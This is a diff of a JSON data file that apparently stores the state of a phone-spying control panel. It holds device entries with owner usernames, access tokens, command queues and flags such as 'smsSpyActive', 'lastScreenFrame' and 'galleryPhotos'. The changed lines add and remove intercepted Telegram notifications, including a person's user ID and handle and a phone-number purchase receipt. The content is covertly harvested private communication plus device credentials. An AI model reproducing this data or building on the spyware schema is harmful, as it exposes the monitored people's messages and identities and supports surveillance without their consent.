@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776772439680,
+    "lastSeen": 1776772442894,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776772439249,
+    "lastSeen": 1776772443408,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "GB PUBLIC FREE PANEL: Rose",
+        "content": "JANGAN LUPA START DULU DI PRIVATE BOT NYET",
+        "time": "21/04 18:54",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776772444169
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PUBLIC FREE PANEL: Rose",
+        "content": "User info:\nID: 7944582539\nFirst Name: ᴋᴅ • ᴊɪʟᴘᴀɴ𝟤𝟩 ⚡\nUsername: @jilpanz\nUser link: link",
+        "time": "21/04 18:54",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776772442624
+      },
       {
         "appName": "Telegram",
         "sender": "GB PUBLIC FREE PANEL: ᴋᴅ • ᴊɪʟᴘᴀɴ𝟤𝟩 ⚡",
@@ -14386,22 +14402,6 @@
         "time": "21/04 18:12",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776769963566
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16985 pesan baru dari 113 obrolan",
-        "time": "21/04 18:12",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769963549
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Whatsapp\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******86\n• Waktu: 21/04/2026, 18.09",
-        "time": "21/04 18:12",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769963531
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776772439980,
+    "lastSeen": 1776772443217,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
